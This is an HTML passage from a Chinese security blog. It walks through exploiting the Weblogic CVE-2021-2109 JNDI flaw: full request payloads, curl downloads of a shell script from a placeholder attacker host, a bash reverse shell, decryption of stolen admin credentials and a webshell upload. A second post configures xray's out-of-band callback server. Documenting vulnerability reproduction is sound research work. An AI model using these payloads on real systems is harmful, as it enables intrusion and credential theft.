+<h4 id="第二步-把shell下载到被攻击机器上"><a href="#第二步-把shell下载到被攻击机器上" class="headerlink" title="第二步 把shell下载到被攻击机器上"></a>第二步 把shell下载到被攻击机器上</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -o /target/path/filename http://xxx.xxx.xxx.xxx.:8080/1.sh</span><br><span class="line">或者</span><br><span class="line">curl -L http://xxx.xxx.xxx.xxx:8080/1.sh -o /target/path/filename</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312102315301.png" alt="image.png"><br>请求包：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1</span><br><span class="line">Host: 192.168.0.103:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">cmd:curl -o /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/1.sh  http://xxx.xxx.xxx.xxx:8000/1.sh </span><br><span class="line">Cookie: ADMINCONSOLESESSION=eGtTalBHY2b2h6x6DfgCrJxbHuT0iMHoaHMslzKGh8mUYeqeRMlD!1764575979</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312102315327.png" alt="image.png"></p>
+<h4 id="第三步-反弹shell"><a href="#第三步-反弹shell" class="headerlink" title="第三步 反弹shell"></a>第三步 反弹shell</h4><p>进行bash反弹<br><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312102315344.png" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1</span><br><span class="line">Host: 192.168.0.103:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">cmd:bash /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/1.sh </span><br><span class="line">Cookie: ADMINCONSOLESESSION=eGtTalBHY2b2h6x6DfgCrJxbHuT0iMHoaHMslzKGh8mUYeqeRMlD!1764575979</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>成功反弹到shell<br><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312102315365.png" alt="image.png"></p>
+<h3 id="深入系列二、通过下载SerializedSystemIni-da文件解密weblogic账号密码"><a href="#深入系列二、通过下载SerializedSystemIni-da文件解密weblogic账号密码" class="headerlink" title="深入系列二、通过下载SerializedSystemIni.da文件解密weblogic账号密码"></a>深入系列二、通过下载SerializedSystemIni.da文件解密weblogic账号密码</h3><h4 id="第一步-找到账号密码和解密文件"><a href="#第一步-找到账号密码和解密文件" class="headerlink" title="第一步 找到账号密码和解密文件"></a>第一步 找到账号密码和解密文件</h4><p>账号密码位置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/security</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312102315383.png" alt="image.png"><br>SerializedSystemIni.dat文件位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/u01/oracle/user_projects/domains/base_domain/security</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312102315398.png" alt="image.png"></p>
+<h4 id="第二步-找到web目录"><a href="#第二步-找到web目录" class="headerlink" title="第二步 找到web目录"></a>第二步 找到web目录</h4><p>war目录一般存在的位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312102315782.png" alt="image.png"><br>将 SerializedSystemIni.dat 拷贝到 war目录<br><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312102315815.png" alt="image.png"></p>
+<h4 id="第三步-下载SerializedSystemIni-dat-并解密"><a href="#第三步-下载SerializedSystemIni-dat-并解密" class="headerlink" title="第三步 下载SerializedSystemIni.dat 并解密"></a>第三步 下载SerializedSystemIni.dat 并解密</h4><p>访问 <a target="_blank" rel="noopener" href="http://192.168.10.53:7001/bea_wls_internal/SerializedSystemIni.dat">http://192.168.10.53:7001/bea_wls_internal&#x2F;SerializedSystemIni.dat</a> 将文件下载下来<br><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312102315851.png" alt="image.png"><br>使用解密工具解密<br><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312102315875.png" alt="image.png"><br><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312102315891.png" alt="image.png"><br><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312102315942.png" alt="image.png"><br>tips：如果AES加密后的密码为：<code>&#123;AES&#125;Nu2LEjo0kxMEd4G5L9bYLE5wI5fztbgeRpFec9wsrcQ\=</code> 破解时需要把后面的\给去掉，不然会执行报错。<br>这个坑…栽了两天，还是用另外一种方法的时候，发现我的错误</p>
+<h3 id="深入系列三、上传webshell"><a href="#深入系列三、上传webshell" class="headerlink" title="深入系列三、上传webshell"></a>深入系列三、上传webshell</h3><p>由于反弹的shell 不够持久，所以想上传个webshell</p>
+<h4 id="第一步-在自己服务器上上传一个马，并且开启下载"><a href="#第一步-在自己服务器上上传一个马，并且开启下载" class="headerlink" title="第一步  在自己服务器上上传一个马，并且开启下载"></a>第一步  在自己服务器上上传一个马，并且开启下载</h4><p>哥斯拉马<br><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312102315177.png" alt="image.png"><br>开启http服务<br><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312102315212.png" alt="image.png"></p>
+<h4 id="第二步-下载文件到被攻击者目录下"><a href="#第二步-下载文件到被攻击者目录下" class="headerlink" title="第二步 下载文件到被攻击者目录下"></a>第二步 下载文件到被攻击者目录下</h4><p>目录为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312102315232.png" alt="image.png"><br>打开<a target="_blank" rel="noopener" href="http://192.168.10.53:7001/bea_wls_internal/shell.jsp">http://192.168.10.53:7001/bea_wls_internal&#x2F;shell.jsp</a> 能成功解析说明存在<br><img src="https://cdn.nlark.com/yuque/0/2021/png/8363905/1616399133213-eae147b5-ea07-4042-bd3a-ad4dca0edfd2.png#height=468&id=FKBwR&originHeight=936&originWidth=1287&originalType=binary&ratio=1&rotation=0&showTitle=false&size=77242&status=done&style=none&title=&width=643.5" alt="image.png"><br>tips：如果不确定下载成功没，可以先在服务器上写一个 1.txt 内容随便写 比如：111。 然后下载到被攻击服务器的web目录上，访问看是否能显示内容</p>
+<h4 id="第四步-使用冰蝎连接"><a href="#第四步-使用冰蝎连接" class="headerlink" title="第四步 使用冰蝎连接"></a>第四步 使用冰蝎连接</h4><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312102315273.png" alt="image.png"></p>
+<h3 id="深入系列四、通过上传解密脚本进行解密（对深入系列二的补充）"><a href="#深入系列四、通过上传解密脚本进行解密（对深入系列二的补充）" class="headerlink" title="深入系列四、通过上传解密脚本进行解密（对深入系列二的补充）"></a>深入系列四、通过上传解密脚本进行解密（对深入系列二的补充）</h3><h4 id="第一步：查看weblogic的密文"><a href="#第一步：查看weblogic的密文" class="headerlink" title="第一步：查看weblogic的密文"></a>第一步：查看weblogic的密文</h4><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312102315302.png" alt="image.png"></p>
+<h4 id="第二步：编辑解密文件，并放在另外一台linux上，并开启http服务"><a href="#第二步：编辑解密文件，并放在另外一台linux上，并开启http服务" class="headerlink" title="第二步：编辑解密文件，并放在另外一台linux上，并开启http服务"></a>第二步：编辑解密文件，并放在另外一台linux上，并开启http服务</h4><p>下载地址：<br><a target="_blank" rel="noopener" href="https://github.com/TideSec/Decrypt_Weblogic_Password/tree/master/Tools7-get_wls_pwd2">Tools7-get_wls_pwd2</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> pageEncoding=<span class="string">&quot;utf-8&quot;</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;weblogic.security.internal.*,weblogic.security.internal.encryption.*&quot;</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">   <span class="type">EncryptionService</span> <span class="variable">es</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">   <span class="type">ClearOrEncryptedService</span> <span class="variable">ces</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    s=<span class="string">&quot;&#123;AES&#125;jZaFirdpzkH727wJt82Xc0QtuHsEuMsvyqcLkjRz/vY=&quot;</span>;</span><br><span class="line">    es = SerializedSystemIni.getEncryptionService();</span><br><span class="line">    <span class="keyword">if</span> (es == <span class="literal">null</span>) &#123;</span><br><span class="line">       out.println(<span class="string">&quot;Unable to initialize encryption service&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ces = <span class="keyword">new</span> <span class="title class_">ClearOrEncryptedService</span>(es);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="literal">null</span>) &#123;</span><br><span class="line">        out.println(<span class="string">&quot;\nDecrypted Password is:&quot;</span> + ces.decrypt(s));</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="第三步：通过curl下载到被攻击机器的web目录下"><a href="#第三步：通过curl下载到被攻击机器的web目录下" class="headerlink" title="第三步：通过curl下载到被攻击机器的web目录下"></a>第三步：通过curl下载到被攻击机器的web目录下</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -o /target/webpath/filename http:<span class="comment">//xxx.xxx.xxx.xxx.:8080/1.sh</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312102315498.png" alt="image.png"><br><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312102315636.png" alt="image.png"></p>
+<h4 id="第四步：访问url查看密码"><a href="#第四步：访问url查看密码" class="headerlink" title="第四步：访问url查看密码"></a>第四步：访问url查看密码</h4><p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312102315685.png" alt="image.png"><br>成功登录<br><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202312102315706.png" alt="image.png"></p>
+<h3 id="思考-amp-小总结"><a href="#思考-amp-小总结" class="headerlink" title="思考&amp;小总结"></a>思考&amp;小总结</h3><p>这个漏洞研究了两三天，前期反弹shell挺顺利的，但是遇到其他问题了。</p>
+<ol>
+<li>深入系列二中，尝试解密weblogic账号密码出了问题，有的环境会因为<code>SerializedSystemIni.dat</code>文件为二进制文件，直接使用浏览器下载可能遭到破坏（但是我也尝试tar打包下载出来，但是文件也出问题了），所以我在深入系列四中换了另外一种思路进行解密。</li>
+<li>碰到的实战中把<code>SerializedSystemIni.dat</code>文件和下载马子到web目录后，通过web无法访问到，这样的话深入系列四也无法进行。因此当web目录无法访问的时候，想要解密console的密码或者拿到webshell 就比较难了。 等后续有时间了会继续摸索其他方法，尝试获取到webshell（因为反弹的shell不持久….）</li>
+</ol>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ol>
+<li><a target="_blank" rel="noopener" href="https://peiqi.wgpsec.org/wiki/webserver/Weblogic/Weblogic%20LDAP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-2109.html">Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/220147.html">一文解密所有WebLogic密文</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/fhf86-FCic2qAkcThvabeQ">Weblogic Server远程代码执行漏洞复现（CVE-2021-2109）</a></li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://suiyideali.github.io/2023/11/29/%E4%B8%BA%E4%BD%A0%E7%9A%84xray%E9%83%A8%E7%BD%B2%E5%8F%8D%E8%BF%9E%E5%B9%B3%E5%8F%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0ch4z">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Geek小黑板">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/11/29/%E4%B8%BA%E4%BD%A0%E7%9A%84xray%E9%83%A8%E7%BD%B2%E5%8F%8D%E8%BF%9E%E5%B9%B3%E5%8F%B0/" class="post-title-link" itemprop="url">为你的xray部署反连平台</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-11-29 12:17:42" itemprop="dateCreated datePublished" datetime="2023-11-29T12:17:42+08:00">2023-11-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-12-14 10:32:01" itemprop="dateModified" datetime="2023-12-14T10:32:01+08:00">2023-12-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">安全工具</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="反连平台的作用"><a href="#反连平台的作用" class="headerlink" title="反连平台的作用"></a>反连平台的作用</h2><p>在平日的漏洞挖掘或者攻防对抗中，遇到诸如log4j rce、fastjson、ssrf、命令执行等没有回显的时候，这个时候dnslog平台这种反连平台就起到了作用，通过让目标执行<code>ping</code>、<code>curl</code>等命令，对反连平台发起请求，反连平台在接受到请求后，就能告诉我们，命令触发了，也就代表了漏洞存在了。 Xray也内置了反连平台，此篇博文记录博主部署Xray反连的过程以及踩坑点。大致流程参照xray官方文档以及互联网文章，如有错误可在此篇博文评论留言。</p>
+<h2 id="搭建前的准备"><a href="#搭建前的准备" class="headerlink" title="搭建前的准备"></a>搭建前的准备</h2><ul>
+<li>一台服务器（博主本人用的Ubuntu）</li>
+<li>一个域名</li>
+<li>Xray</li>
+</ul>
+<h3 id="服务器安全组设置"><a href="#服务器安全组设置" class="headerlink" title="服务器安全组设置"></a>服务器安全组设置</h3><p>修改安全组策略，开启53端口（⚠️<strong>注意</strong>，协议类型一定要是<strong>UDP</strong>）</p>
+<p>修改安全组策略，开启反连平台的端口，如8888等（⚠️<strong>注意</strong>，协议类型一定要是<strong>TCP</strong>）</p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311291546528.png" alt="修改安全组策略"></p>
+<h3 id="解决53端口占用"><a href="#解决53端口占用" class="headerlink" title="解决53端口占用"></a>解决53端口占用</h3><p>使用以下命令确认端口占用情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo netstat -nultp</span><br></pre></td></tr></table></figure>
+
+<p>在确认被占用后，可以执行如下命令停用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemd-resolved`sudo systemctl stop systemd-resolved</span><br></pre></td></tr></table></figure>
+
+<p>编辑resolved.conf </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/systemd/resolved.conf</span><br></pre></td></tr></table></figure>
+
+<p>取消DNS的注释，填写云服务器公网IP</p>
+<p>取消DNSStubListener的注释，将值改为no</p>
+<p>如下：</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[Resolve]</span><br><span class="line">DNS=x.x.x.x         <span class="params">#</span>取消注释，增加dns，此处的值可以填写你的云服务器公网IP</span><br><span class="line"><span class="params">#</span>FallbackDNS=</span><br><span class="line"><span class="params">#</span>Domains=</span><br><span class="line"><span class="params">#</span>LLMNR=no</span><br><span class="line"><span class="params">#</span>MulticastDNS=no</span><br><span class="line"><span class="params">#</span>DNSSEC=no</span><br><span class="line"><span class="params">#</span>DNSOverTLS=no</span><br><span class="line"><span class="params">#</span>Cache=no-negative</span><br><span class="line">DNSStubListener=no    <span class="params">#</span>取消注释，把yes改为no</span><br><span class="line"><span class="params">#</span>ReadEtcHosts=yes</span><br></pre></td></tr></table></figure>
+
+<p>修改完后执行以下命令，即可解除占用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">ln</span> -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311291551473.png" alt="解除53端口占用"></p>
+<h3 id="域名的配置"><a href="#域名的配置" class="headerlink" title="域名的配置"></a>域名的配置</h3><p>为了<strong>支持http&#x2F;rmi&#x2F;dns的反连</strong>，进行以下配置</p>
+<p>⚠️ 踩坑点：如果域名是在国内域名提供商注册的，服务器最好也是国内的，这样域名解析会正常，博主本人最开始用国内域名+国外服务器，导致域名解析不正常，dns或者rmi无法使用。需要注意。</p>
+<ol>
+<li><p><strong>自定义DNS Host</strong></p>
+<p>DNS服务器为主机记录和你的域名，如: ns1.domain.com ，IP地址为你的云服务器IP</p>
+</li>
+</ol>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311291640847.png" alt="自定义DNS"></p>
+<ol start="2">
+<li><p><strong>设置域名解析记录</strong></p>
+<p>记录值为你的云服务器IP</p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311291645297.png" alt="设置域名解析记录"></p>
+</li>
+<li><p><strong>修改DNS服务器</strong></p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311291647842.png" alt="修改DNS服务器"></p>
+</li>
+</ol>
+<h2 id="部署反连平台"><a href="#部署反连平台" class="headerlink" title="部署反连平台"></a>部署反连平台</h2><p>博主这里使用的独立远程服务端</p>
+<h3 id="远程服务端"><a href="#远程服务端" class="headerlink" title="远程服务端"></a>远程服务端</h3><p><strong>服务端xray的配置文件reverse如下</strong></p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">reverse:</span></span><br><span class="line">  <span class="attr">db_file_path:</span> <span class="string">&quot;reverse.db&quot;</span>                      <span class="comment"># 反连平台数据库文件位置, 这是一个 KV 数据库</span></span><br><span class="line">  <span class="attr">token:</span> <span class="string">&quot;1qaz@WSX&quot;</span>                             <span class="comment"># 反连平台认证的 Token, 独立部署时不能为空</span></span><br><span class="line">  <span class="attr">http:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">listen_ip:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> </span><br><span class="line">    <span class="attr">listen_port:</span> <span class="string">&quot;8888&quot;</span></span><br><span class="line">    <span class="attr">ip_header:</span> <span class="string">&quot;&quot;</span>                       <span class="comment"># 在哪个 http header 中取 ip，为空代表从 REMOTE_ADDR 中取</span></span><br><span class="line">  <span class="attr">dns:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">listen_ip:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> </span><br><span class="line">    <span class="attr">domain:</span> <span class="string">&quot;your_domain&quot;</span>                          <span class="comment"># DNS 域名配置</span></span><br><span class="line">    <span class="attr">is_domain_name_server:</span> <span class="literal">true</span>        <span class="comment"># 是否修改了域名的 ns 为反连平台，如果是，那 nslookup 等就不需要指定 dns 了</span></span><br><span class="line">    <span class="attr">resolve:</span>                            <span class="comment"># DNS 静态解析规则</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">A</span>                           <span class="comment"># A, AAAA, TXT 三种</span></span><br><span class="line">      <span class="attr">record:</span> <span class="string">localhost</span></span><br><span class="line">      <span class="attr">value:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">      <span class="attr">ttl:</span> <span class="number">60</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">remote_server:</span> <span class="literal">false</span>                <span class="comment"># 是否是独立的远程 server，如果是要在下面配置好远程的服务端地址</span></span><br><span class="line">    <span class="attr">http_base_url:</span> <span class="string">&quot;http://your_vps_ip:8888&quot;</span>                   <span class="comment"># 默认将根据 ListenIP 和 ListenPort 生成，该地址是存在漏洞的目标反连回来的地址, 当反连平台前面有反代、绑定域名、端口映射时需要自行配置</span></span><br><span class="line">    <span class="attr">dns_server_ip:</span> <span class="string">&quot;your_vps_ip&quot;</span>                   <span class="comment"># 和 http_base_url 类似，实际用来访问 dns 服务器的地址</span></span><br></pre></td></tr></table></figure>
+
+<p>⚠️ 需要注意填写位置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">db_file_path: 此处填写你要命名的kv数据库，如test.db</span><br><span class="line">token: 为你连接反连平台的认证</span><br><span class="line">enabled: 服务端需要设置的有 http、dns；客户端配置文件此处设置为false就行</span><br><span class="line">http_base_url: 你的云服务器加端口号，端口号为listen_port</span><br><span class="line">dns_server_ip: 你的云服务器IP</span><br></pre></td></tr></table></figure>
+
+<h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p><strong>客户端xray的配置文件reverse如下</strong></p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">reverse:</span></span><br><span class="line">  <span class="attr">db_file_path:</span> <span class="string">&quot;&quot;</span>                      <span class="comment"># 反连平台数据库文件位置, 这是一个 KV 数据库</span></span><br><span class="line">  <span class="attr">token:</span> <span class="string">&quot;1qaz@WSX&quot;</span>                             <span class="comment"># 反连平台认证的 Token, 独立部署时不能为空</span></span><br><span class="line">  <span class="attr">http:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">listen_ip:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> </span><br><span class="line">    <span class="attr">listen_port:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="attr">ip_header:</span> <span class="string">&quot;&quot;</span>                       <span class="comment"># 在哪个 http header 中取 ip，为空代表从 REMOTE_ADDR 中取</span></span><br><span class="line">  <span class="attr">dns:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">listen_ip:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> </span><br><span class="line">    <span class="attr">domain:</span> <span class="string">&quot;&quot;</span>                          <span class="comment"># DNS 域名配置</span></span><br><span class="line">    <span class="attr">is_domain_name_server:</span> <span class="literal">false</span>        <span class="comment"># 是否修改了域名的 ns 为反连平台，如果是，那 nslookup 等就不需要指定 dns 了</span></span><br><span class="line">    <span class="attr">resolve:</span>                            <span class="comment"># DNS 静态解析规则</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">A</span>                           <span class="comment"># A, AAAA, TXT 三种</span></span><br><span class="line">      <span class="attr">record:</span> <span class="string">localhost</span></span><br><span class="line">      <span class="attr">value:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">      <span class="attr">ttl:</span> <span class="number">60</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">remote_server:</span> <span class="literal">true</span>                <span class="comment"># 是否是独立的远程 server，如果是要在下面配置好远程的服务端地址</span></span><br><span class="line">    <span class="attr">http_base_url:</span> <span class="string">&quot;http://your_vps_ip:8888&quot;</span>                   <span class="comment"># 默认将根据 ListenIP 和 ListenPort 生成，该地址是存在漏洞的目标反连回来的地址, 当反连平台前面有反代、绑定域名、端口映射时需要自行配置</span></span><br><span class="line">    <span class="attr">dns_server_ip:</span> <span 